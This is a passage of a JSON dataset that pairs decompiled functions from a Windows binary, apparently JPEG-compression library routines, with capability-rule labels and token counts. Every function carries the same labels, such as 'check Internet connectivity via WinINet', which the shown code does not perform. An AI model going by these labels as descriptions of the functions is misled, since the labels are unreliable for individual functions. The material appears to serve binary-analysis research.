            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043e904(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t *piVar2;\n    \n    if (in_EAX[5] != 100) {\n        iVar1 = *in_EAX;\n        *(iVar1 + 0x14) = 0x14;\n        *(iVar1 + 0x18) = in_EAX[5];\n        (***in_EAX)();\n    }\n    if (in_EAX[0x10] == 0) {\n        iVar1 = (**in_EAX[1])();\n        in_EAX[0x10] = iVar1;\n    }\n    in_EAX[0xd] = 8;\n    fcn.0043e808();\n    fcn.0043e8ac();\n    iVar1 = 0;\n    piVar2 = in_EAX + 0x1d;\n    do {\n        *piVar2 = 0;\n        *(piVar2 + 4) = 1;\n        *(piVar2 + 8) = 5;\n        iVar1 = iVar1 + 1;\n        piVar2 = piVar2 + 1;\n    } while (iVar1 < 0x10);\n    in_EAX[0x2a] = 0;\n    in_EAX[0x29] = 0;\n    in_EAX[0x2b] = 0;\n    in_EAX[0x2c] = 0;\n    in_EAX[0x2d] = 0;\n    if (8 < in_EAX[0xd]) {\n        in_EAX[0x2d] = 1;\n    }\n    in_EAX[0x2e] = 0;\n    in_EAX[0x2f] = 0;\n    in_EAX[0x30] = 2;\n    in_EAX[0x31] = 0;\n    in_EAX[0x32] = 0;\n    *(in_EAX + 0x34) = 1;\n    *(in_EAX + 0xd1) = 1;\n    *(in_EAX + 0xd2) = 0;\n    *(in_EAX + 0x35) = 1;\n    *(in_EAX + 0xd6) = 1;\n    fcn.0043ea04();\n    return;\n}\n",
        "token_count": 524
    },
    "0043eee0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043eee0(uint param_1)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar1 = in_EAX[0xe];\n    if (in_EAX[5] != 100) {\n        iVar3 = *in_EAX;\n        *(iVar3 + 0x14) = 0x14;\n        *(iVar3 + 0x18) = in_EAX[5];\n        (***in_EAX)(param_1);\n    }\n    if ((iVar1 == 3) && (in_EAX[0xf] == 3)) {\n        iVar3 = 10;\n    }\n    else if (iVar1 < 5) {\n        iVar3 = iVar1 * 4 + 2;\n    }\n    else {\n        iVar3 = iVar1 * 6;\n    }\n    if ((in_EAX[0x5b] == 0) || (in_EAX[0x5c] < iVar3)) {\n        iVar2 = iVar3;\n        if (iVar3 < 0xb) {\n            iVar2 = 10;\n        }\n        in_EAX[0x5c] = iVar2;\n        iVar2 = (**in_EAX[1])();\n        in_EAX[0x5b] = iVar2;\n    }\n    in_EAX[0x2a] = in_EAX[0x5b];\n    in_EAX[0x29] = iVar3;\n    if ((iVar1 == 3) && (in_EAX[0xf] == 3)) {\n        fcn.0043ee94(1);\n        fcn.0043ee30(2, 0, 5);\n        fcn.0043ee30(1, 0, 0x3f);\n        fcn.0043ee30(1, 0, 0x3f);\n        fcn.0043ee30(2, 0, 0x3f);\n        fcn.0043ee30(1, 2, 0x3f);\n        fcn.0043ee94(0);\n        fcn.0043ee30(0, 1, 0x3f);\n        fcn.0043ee30(0, 1, 0x3f);\n        fcn.0043ee30(0, 1, 0x3f);\n    }\n    else {\n        fcn.0043ee94(1);\n        fcn.0043ee58(2, 0, 5);\n        fcn.0043ee58(2, 0, 0x3f);\n        fcn.0043ee58(1, 2, 0x3f);\n        fcn.0043ee94(0);\n        fcn.0043ee58(0, 1, 0x3f);\n    }\n    return;\n}\n",
        "token_count": 647
    },
    "0043f0f8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043f0f8(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    if (in_EAX[5] != 100) {\n        iVar1 = *in_EAX;\n        *(iVar1 + 0x14) = 0x14;\n        *(iVar1 + 0x18) = in_EAX[5];\n        (***in_EAX)();\n    }\n    if (param_2 != 0) {\n        fcn.0043f3b0();\n    }\n    (**(*in_EAX + 0x10))();\n    (**(in_EAX[6] + 8))();\n    fcn.0043f5ec();\n    (**in_EAX[0x52])();\n    in_EAX[0x37] = 0;\n    if (in_EAX[0x2b] == 0) {\n        iVar1 = 0x65;\n    }\n    else {\n        iVar1 = 0x66;\n    }\n    in_EAX[5] = iVar1;\n    return;\n}\n",
        "token_count": 250
    },
    "0043f16c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0043f16c(uint32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    \n    if (in_EAX[5] != 0x65) {\n        iVar1 = *in_EAX;\n        *(iVar1 + 0x14) = 0x14;\n        *(iVar1 + 0x18) = in_EAX[5];\n        (***in_EAX)(param_1);\n    }\n    if (in_EAX[8] <= in_EAX[0x37]) {\n        *(*in_EAX + 0x14) = 0x7b;\n        (**(*in_EAX + 4))();\n    }\n    iVar1 = in_EAX[2];\n    if (iVar1 != 0) {\n        *(iVar1 + 4) = in_EAX[0x37];\n        *(iVar1 + 8) = in_EAX[8];\n        (**in_EAX[2])();\n    }\n    if (*(in_EAX[0x52] + 0xc) != 0) {\n        (**(in_EAX[0x52] + 4))();\n    }\n    if (in_EAX[8] - in_EAX[0x37] < param_1) {\n        param_1 = in_EAX[8] - in_EAX[0x37];\n    }\n    (**(in_EAX[0x53] + 4))(param_1, 0);\n    in_EAX[0x37] = in_EAX[0x37] + param_1;\n    return CONCAT44(param_1, param_1);\n}\n",
        "token_count": 364
    },
    "0043f3f8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043f3f8(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    if ((in_EAX[5] == 0x65) || (in_EAX[5] == 0x66)) {\n        if (in_EAX[0x37] < in_EAX[8]) {\n            *(*in_EAX + 0x14) = 0x43;\n            (***in_EAX)();\n        }\n        (**(in_EAX[0x52] + 8))();\n    }\n    else if (in_EAX[5] != 0x67) {\n        iVar1 = *in_EAX;\n        *(iVar1 + 0x14) = 0x14;\n        *(iVar1 + 0x18) = in_EAX[5];\n        (***in_EAX)();\n    }\n    while (*(in_EAX[0x52] + 0x10) == 0) {\n        (**in_EAX[0x52])();\n        for (uVar2 = 0; uVar2 < in_EAX[0x3b]; uVar2 = uVar2 + 1) {\n            iVar1 = in_EAX[2];\n            if (iVar1 != 0) {\n                *(iVar1 + 4) = uVar2;\n                *(iVar1 + 8) = in_EAX[0x3b];\n                (**in_EAX[2])();\n            }\n            iVar1 = (**(in_EAX[0x55] + 4))();\n            if (iVar1 == 0) {\n                *(*in_EAX + 0x14) = 0x18;\n                (***in_EAX)();\n            }\n        }\n        (**(in_EAX[0x52] + 8))();\n    }\n    (**(in_EAX[0x56] + 0xc))();\n    (**(in_EAX[6] + 0x10))();\n    fcn.0043e54c();\n    return;\n}\n",
        "token_count": 452
    },
    "0043f4d4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043f4d4(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int32_t *in_EAX;\n    \n    if ((in_EAX[0x37] != 0) || (((iVar1 = in_EAX[5],  iVar1 != 0x65 && (iVar1 != 0x66)) && (iVar1 != 0x67)))) {\n        iVar1 = *in_EAX;\n        *(iVar1 + 0x14) = 0x14;\n        *(iVar1 + 0x18) = in_EAX[5];\n        (***in_EAX)();\n    }\n    (**(in_EAX[0x56] + 0x14))();\n    pcVar2 = *(in_EAX[0x56] + 0x18);\n    while (arg_8h != 0) {\n        (*pcVar2)();\n        arg_8h = arg_8h + -1;\n    }\n    return;\n}\n",
        "token_count": 228
    },
    "0043f5ec": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043f5ec(void)\n\n{\n    int32_t *in_EAX;\n    \n    fcn.00440928();\n    if (in_EAX[0x2b] == 0) {\n        fcn.00441cc8();\n        fcn.004426b4();\n        fcn.00440fe0();\n    }\n    fcn.00442cd8();\n    if (in_EAX[0x2c] == 0) {\n        if (in_EAX[0x38] == 0) {\n            fcn.00444a1c();\n        }\n        else {\n            fcn.004437e4();\n        }\n    }\n    else {\n        *(*in_EAX + 0x14) = 1;\n        (***in_EAX)();\n    }\n    fcn.004417c4();\n    fcn.00440ac8();\n    fcn.0043fe6c();\n    (**(in_EAX[1] + 0x18))();\n    (**in_EAX[0x56])();\n    return;\n}\n",
        "token_count": 233
    },
    "0043f714": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0043f714(uint param_1, int32_t param_2)\n\n{\n    uint16_t *puVar1;\n    int32_t *in_EAX;\n    uint16_t *puVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t *piStack20;\n    \n    puVar1 = in_EAX[param_2 + 0x11];\n    if (puVar1 == NULL) {\n        iVar4 = *in_EAX;\n        *(iVar4 + 0x14) = 0x34;\n        *(iVar4 + 0x18) = param_2;\n        (***in_EAX)();\n    }\n    iVar5 = 0;\n    iVar4 = 0;\n    puVar2 = puVar1;\n    do {\n        if (0xff < *puVar2) {\n            iVar5 = 1;\n        }\n        iVar4 = iVar4 + 1;\n        puVar2 = puVar2 + 1;\n    } while (iVar4 < 0x40);\n    if (*(puVar1 + 0x40) == 0) {\n        fcn.0043f6c8();\n        fcn.0043f6e8();\n        fcn.0043f698();\n        piStack20 = 0x4a24b0;\n        iVar4 = 0;\n        do {\n            uVar3 = puVar1[*piStack20];\n            if (iVar5 != 0) {\n                fcn.0043f698(param_2, uVar3);\n            }\n            fcn.0043f698(param_2, uVar3);\n            iVar4 = iVar4 + 1;\n            piStack20 = piStack20 + 1;\n        } while (iVar4 < 0x40);\n        *(puVar1 + 0x40) = 1;\n    }\n    return iVar5;\n}\n",
        "token_count": 428
    },
    "0043f7f8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043f7f8(int32_t param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    uint8_t *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint8_t *puVar4;\n    uint8_t *puVar5;\n    \n    if (param_1 == 0) {\n        puVar4 = in_EAX[param_2 + 0x15];\n    }\n    else {\n        puVar4 = in_EAX[param_2 + 0x19];\n        param_2 = param_2 + 0x10;\n    }\n    if (puVar4 == NULL) {\n        iVar2 = *in_EAX;\n        *(iVar2 + 0x14) = 0x32;\n        *(iVar2 + 0x18) = param_2;\n        (***in_EAX)();\n    }\n    if (*(puVar4 + 0x114) == 0) {\n        fcn.0043f6c8();\n        iVar3 = 0;\n        iVar2 = 1;\n        puVar1 = puVar4;\n        do {\n            puVar1 = puVar1 + 1;\n            iVar2 = iVar2 + 1;\n            iVar3 = iVar3 + *puVar1;\n        } while (iVar2 < 0x11);\n        fcn.0043f6e8();\n        fcn.0043f698();\n        iVar2 = 1;\n        puVar1 = puVar4 + 1;\n        do {\n            fcn.0043f698(param_2, puVar1);\n            iVar2 = iVar2 + 1;\n            puVar1 = puVar1 + 1;\n        } while (iVar2 < 0x11);\n        iVar2 = 0;\n        puVar5 = puVar4 + 0x11;\n        if (0 < iVar3) {\n            do {\n                fcn.0043f698(param_2, puVar1, puVar5);\n                iVar2 = iVar2 + 1;\n                puVar5 = puVar5 + 1;\n            } while (iVar2 < iVar3);\n        }\n        *(puVar4 + 0x114) = 1;\n    }\n    return;\n}\n",
        "token_count": 504
    },
    "0043f9a8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043f9a8(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    fcn.0043f6c8();\n    fcn.0043f6e8();\n    fcn.0043f698();\n    for (iVar1 = 0; iVar1 < *(in_EAX + 0xf0); iVar1 = iVar1 + 1) {\n        fcn.0043f698();\n        fcn.0043f698();\n    }\n    fcn.0043f698();\n    fcn.0043f698();\n    fcn.0043f698();\n    return;\n}\n",
        "token_count": 144
    },
    "0043fec0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0043ff20)\n\nvoid fcn.0043fec0(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    if ((((in_EAX[8] == 0) || (in_EAX[7] == 0)) || (in_EAX[0xe] < 1)) || (in_EAX[9] < 1)) {\n        *(*in_EAX + 0x14) = 0x20;\n        (***in_EAX)();\n    }\n    if ((0xffdc < in_EAX[8]) || (0xffdc < in_EAX[7])) {\n        iVar3 = *in_EAX;\n        *(iVar3 + 0x14) = 0x29;\n        *(iVar3 + 0x18) = 0xffdc;\n        (***in_EAX)();\n    }\n    if (in_EAX[0xd] != 8) {\n        iVar3 = *in_EAX;\n        *(iVar3 + 0x14) = 0xf;\n        *(iVar3 + 0x18) = in_EAX[0xd];\n        (***in_EAX)();\n    }\n    if (10 < in_EAX[0xe]) {\n        iVar3 = *in_EAX;\n        *(iVar3 + 0x14) = 0x1a;\n        *(iVar3 + 0x18) = in_EAX[0xe];\n        *(iVar3 + 0x1c) = 10;\n        (***in_EAX)();\n    }\n    in_EAX[0x39] = 1;\n    in_EAX[0x3a] = 1;\n    iVar3 = in_EAX[0x10];\n    for (iVar4 = 0; iVar4 < in_EAX[0xe]; iVar4 = iVar4 + 1) {\n        if (((*(iVar3 + 8) < 1) || (4 < *(iVar3 + 8))) || ((*(iVar3 + 0xc) < 1 || (4 < *(iVar3 + 0xc))))) {\n            *(*in_EAX + 0x14) = 0x12;\n            (***in_EAX)();\n        }\n        if (*(iVar3 + 8) < in_EAX[0x39]) {\n            iVar1 = in_EAX[0x39];\n        }\n        else {\n            iVar1 = *(iVar3 + 8);\n        }\n        in_EAX[0x39] = iVar1;\n        if (*(iVar3 + 0xc) < in_EAX[0x3a]) {\n            iVar1 = in_EAX[0x3a];\n        }\n        else {\n            iVar1 = *(iVar3 + 0xc);\n        }\n        in_EAX[0x3a] = iVar1;\n        iVar3 = iVar3 + 0x54;\n    }\n    iVar3 = in_EAX[0x10];\n    for (iVar4 = 0; iVar4 < in_EAX[0xe]; iVar4 = iVar4 + 1) {\n        *(iVar3 + 4) = iVar4;\n        *(iVar3 + 0x24) = 8;\n        uVar2 = fcn.0043e4b8();\n        *(iVar3 + 0x1c) = uVar2;\n        uVar2 = fcn.0043e4b8();\n        *(iVar3 + 0x20) = uVar2;\n        uVar2 = fcn.0043e4b8();\n        *(iVar3 + 0x28) = uVar2;\n        uVar2 = fcn.0043e4b8();\n        *(iVar3 + 0x2c) = uVar2;\n        *(iVar3 + 0x30) = 1;\n        iVar3 = iVar3 + 0x54;\n    }\n    iVar3 = fcn.0043e4b8();\n    in_EAX[0x3b] = iVar3;\n    return;\n}\n",
        "token_count": 903
    },
    "00440084": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00440084(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t *in_EAX;\n    int32_t *piVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t *piStack2648;\n    int32_t iStack2644;\n    int32_t iStack2636;\n    int32_t *piStack2620;\n    int32_t aiStack2616 [10];\n    int32_t aiStack2576 [640];\n    \n    if (in_EAX[0x29] < 1) {\n        *(*in_EAX + 0x14) = 0x13;\n        *(*in_EAX + 0x18) = 0;\n        (***in_EAX)();\n    }\n    piStack2648 = in_EAX[0x2a];\n    if ((piStack2648[5] == 0) && (piStack2648[6] == 0x3f)) {\n        in_EAX[0x38] = 0;\n        piVar6 = aiStack2616;\n        for (iStack2636 = 0; iStack2636 < in_EAX[0xe]; iStack2636 = iStack2636 + 1) {\n            *piVar6 = 0;\n            piVar6 = piVar6 + 1;\n        }\n    }\n    else {\n        in_EAX[0x38] = 1;\n        piVar6 = aiStack2576;\n        for (iStack2636 = 0; iStack2636 < in_EAX[0xe]; iStack2636 = iStack2636 + 1) {\n            iVar7 = 0;\n            do {\n                *piVar6 = -1;\n                piVar6 = piVar6 + 1;\n                iVar7 = iVar7 + 1;\n            } while (iVar7 < 0x40);\n        }\n    }\n    for (iStack2644 = 1; iStack2644 <= in_EAX[0x29]; iStack2644 = iStack2644 + 1) {\n        iVar7 = *piStack2648;\n        if ((iVar7 < 1) || (4 < iVar7)) {\n            iVar1 = *in_EAX;\n            *(iVar1 + 0x14) = 0x1a;\n            *(iVar1 + 0x18) = iVar7;\n            *(iVar1 + 0x1c) = 4;\n            (***in_EAX)();\n        }\n        iStack2636 = 0;\n        piVar6 = piStack2648;\n        if (0 < iVar7) {\n            do {\n                iVar1 = piVar6[1];\n                if ((iVar1 < 0) || (in_EAX[0xe] <= iVar1)) {\n                    iVar2 = *in_EAX;\n                    *(iVar2 + 0x14) = 0x13;\n                    *(iVar2 + 0x18) = iStack2644;\n                    (***in_EAX)();\n                }\n                if ((0 < iStack2636) && (iVar1 <= *piVar6)) {\n                    iVar1 = *in_EAX;\n                    *(iVar1 + 0x14) = 0x13;\n                    *(iVar1 + 0x18) = iStack2644;\n                    (***in_EAX)();\n                }\n                iStack2636 = iStack2636 + 1;\n                piVar6 = piVar6 + 1;\n            } while (iStack2636 < iVar7);\n        }\n        iVar1 = piStack2648[5];\n        iVar2 = piStack2648[6];\n        iVar3 = piStack2648[7];\n        iVar4 = piStack2648[8];\n        if (in_EAX[0x38] == 0) {\n            if ((((iVar1 != 0) || (iVar2 != 0x3f)) || (iVar3 != 0)) || (iVar4 != 0)) {\n                iVar1 = *in_EAX;\n                *(iVar1 + 0x14) = 0x11;\n                *(iVar1 + 0x18) = iStack2644;\n                (***in_EAX)();\n            }\n            iStack2636 = 0;\n            piVar6 = piStack2648;\n            if (0 < iVar7) {\n                do {\n                    piVar6 = piVar6 + 1;\n                    iVar1 = *piVar6;\n                    if (aiStack2616[iVar1] != 0) {\n                        iVar2 = *in_EAX;\n                        *(iVar2 + 0x14) = 0x13;\n                        *(iVar2 + 0x18) = iStack2644;\n                        (***in_EAX)();\n                    }\n                    aiStack2616[iVar1] = 1;\n                    iStack2636 = iStack2636 + 1;\n                } while (iStack2636 < iVar7);\n            }\n        }\n        else {\n            if (((((iVar1 < 0) || (0x3f < iVar1)) || ((iVar2 < iVar1 || ((0x3f < iVar2 || (iVar3 < 0)))))) ||\n                (10 < iVar3)) || ((iVar4 < 0 || (10 < iVar4)))) {\n                iVar8 = *in_EAX;\n                *(iVar8 + 0x14) = 0x11;\n                *(iVar8 + 0x18) = iStack2644;\n                (***in_EAX)();\n            }\n            if (iVar1 == 0) {\n                if (iVar2 != 0) {\n                    iVar8 = *in_EAX;\n                    *(iVar8 + 0x14) = 0x11;\n                    *(iVar8 + 0x18) = iStack2644;\n                    (***in_EAX)();\n                }\n            }\n            else if (iVar7 != 1) {\n                iVar8 = *in_EAX;\n                *(iVar8 + 0x14) = 0x11;\n                *(iVar8 + 0x18) = iStack2644;\n                (***in_EAX)();\n            }\n            iStack2636 = 0;\n            piStack2620 = piStack2648;\n            if (0 < iVar7) {\n                do {\n                    piStack2620 = piStack2620 + 1;\n                    iVar8 = *piStack2620;\n                    if ((iVar1 != 0) && (aiStack2576[iVar8 * 0x40] < 0)) {\n                        iVar5 = *in_EAX;\n                        *(iVar5 + 0x14) = 0x11;\n                        *(iVar5 + 0x18) = iStack2644;\n                        (***in_EAX)();\n                    }\n                    piVar6 = aiStack2576 + iVar8 * 0x40 + iVar1;\n                    for (iVar8 = iVar1; iVar8 <= iVar2; iVar8 = iVar8 + 1) {\n                        if (*piVar6 < 0) {\n                            if (iVar3 != 0) {\n                                iVar5 = *in_EAX;\n                                *(iVar5 + 0x14) = 0x11;\n                                *(iVar5 + 0x18) = iStack2644;\n                                (***in_EAX)();\n                            }\n                        }\n                        else if ((iVar3 != *piVar6) || (iVar3 + -1 != iVar4)) {\n                            iVar5 = *in_EAX;\n                            *(iVar5 + 0x14) = 0x11;\n                            *(iVar5 + 0x18) = iStack2644;\n                            (***in_EAX)();\n                        }\n                        *piVar6 = iVar4;\n                        piVar6 = piVar6 + 1;\n                    }\n                    iStack2636 = iStack2636 + 1;\n                } while (iStack2636 < iVar7);\n            }\n        }\n        piStack2648 = piStack2648 + 9;\n    }\n    if (in_EAX[0x38] == 0) {\n        piVar6 = aiStack2616;\n        for (iStack2636 = 0; iStack2636 < in_EAX[0xe]; iStack2636 = iStack2636 + 1) {\n            if (*piVar6 == 0) {\n                *(*in_EAX + 0x14) = 0x2d;\n                (***in_EAX)();\n            }\n            piVar6 = piVar6 + 1;\n        }\n    }\n    else {\n        piVar6 = aiStack2576;\n        for (iStack2636 = 0; iStack2636 < in_EAX[0xe]; iStack2636 = iStack2636 + 1) {\n            if (*piVar6 < 0) {\n                *(*in_EAX + 0x14) = 0x2d;\n                (***in_EAX)();\n            }\n            piVar6 = piVar6 + 0x40;\n        }\n    }\n    return;\n}\n",
        "token_count": 1984
    },
    "00440928": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00440928(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint *puVar1;\n    \n    puVar1 = (***(in_EAX + 4))();\n    *(in_EAX + 0x148) = puVar1;\n    *puVar1 = 0x440708;\n    puVar1[1] = 0x4408a4;\n    puVar1[2] = 0x4408cc;\n    puVar1[4] = 0;\n    fcn.0043fec0();\n    if (*(in_EAX + 0xa8) == 0) {\n        *(in_EAX + 0xe0) = 0;\n        *(in_EAX + 0xa4) = 1;\n    }\n    else {\n        fcn.00440084();\n    }\n    if (*(in_EAX + 0xe0) != 0) {\n        *(in_EAX + 0xb4) = 1;\n    }\n    if (param_2 == 0) {\n        puVar1[5] = 0;\n    }\n    else if (*(in_EAX + 0xb4) == 0) {\n        puVar1[5] = 2;\n    }\n    else {\n        puVar1[5] = 1;\n    }\n    puVar1[8] = 0;\n    puVar1[6] = 0;\n    if (*(in_EAX + 0xb4) == 0) {\n        puVar1[7] = *(in_EAX + 0xa4);\n    }\n    else {\n        puVar1[7] = *(in_EAX + 0xa4) * 2;\n    }\n    return;\n}\n",
        "token_count": 390
    },
    "00440a30": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00440a30(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = *(in_EAX + 0x14c);\n    while( true ) {\n        if (*(in_EAX + 0xec) <= *(iVar1 + 8)) {\n            return;\n        }\n        if (*(iVar1 + 0xc) < 8) {\n            (**(*(in_EAX + 0x150) + 4))(8, iVar1 + 0xc, iVar1 + 0x18, arg_8h);\n        }\n        if (*(iVar1 + 0xc) != 8) break;\n        iVar2 = (**(*(in_EAX + 0x154) + 4))();\n        if (iVar2 == 0) {\n            if (*(iVar1 + 0x10) != 0) {\n                return;\n            }\n            *in_ECX = *in_ECX + -1;\n            *(iVar1 + 0x10) = 1;\n            return;\n        }\n        if (*(iVar1 + 0x10) != 0) {\n            *in_ECX = *in_ECX + 1;\n            *(iVar1 + 0x10) = 0;\n        }\n        *(iVar1 + 0xc) = 0;\n        *(iVar1 + 8) = *(iVar1 + 8) + 1;\n    }\n    return;\n}\n",
        "token_count": 350
    },
    "00440ac8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00440ac8(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    uint *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    puVar1 = (**in_EAX[1])(param_1);\n    in_EAX[0x53] = puVar1;\n    *puVar1 = 0x4409f0;\n    if (in_EAX[0x2b] == 0) {\n        if (param_2 == 0) {\n            puVar1 = puVar1 + 6;\n            iVar3 = in_EAX[0x10];\n            for (iVar4 = 0; iVar4 < in_EAX[0xe]; iVar4 = iVar4 + 1) {\n                uVar2 = (**(in_EAX[1] + 8))(*(iVar3 + 0xc) << 3);\n                *puVar1 = uVar2;\n                puVar1 = puVar1 + 1;\n                iVar3 = iVar3 + 0x54;\n            }\n        }\n        else {\n            *(*in_EAX + 0x14) = 4;\n            (***in_EAX)();\n        }\n    }\n    return;\n}\n",
        "token_count": 286
    },
    "00440bc0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00440bc0(uint32_t arg_8h, uint32_t *arg_ch, uint arg_10h, uint32_t arg_14h)\n\n{\n    int32_t in_EAX;\n    uint32_t *in_ECX;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar3 = *(in_EAX + 0x150);\n    while( true ) {\n        if (arg_14h <= *in_ECX) {\n            return;\n        }\n        if (arg_8h <= *arg_ch) break;\n        uVar1 = *(in_EAX + 0xe8) - *(iVar3 + 0x34);\n        uVar2 = arg_14h - *in_ECX;\n        if (uVar1 < uVar2) {\n            uVar2 = uVar1;\n        }\n        (**(*(in_EAX + 0x15c) + 4))(uVar2, *(iVar3 + 0x34));\n        *in_ECX = *in_ECX + uVar2;\n        *(iVar3 + 0x34) = *(iVar3 + 0x34) + uVar2;\n        *(iVar3 + 0x30) = *(iVar3 + 0x30) - uVar2;\n        if ((*(iVar3 + 0x30) == 0) && (*(iVar3 + 0x34) < *(in_EAX + 0xe8))) {\n            for (iVar4 = 0; iVar4 < *(in_EAX + 0x38); iVar4 = iVar4 + 1) {\n                fcn.00440b88(*(in_EAX + 0xe8));\n            }\n            *(iVar3 + 0x34) = *(in_EAX + 0xe8);\n        }\n        if (*(iVar3 + 0x34) == *(in_EAX + 0xe8)) {\n            (**(*(in_EAX + 0x160) + 4))(*arg_ch, arg_10h);\n            *(iVar3 + 0x34) = 0;\n            *arg_ch = *arg_ch + 1;\n        }\n        if ((*(iVar3 + 0x30) == 0) && (*arg_ch < arg_8h)) {\n            iVar3 = *(in_EAX + 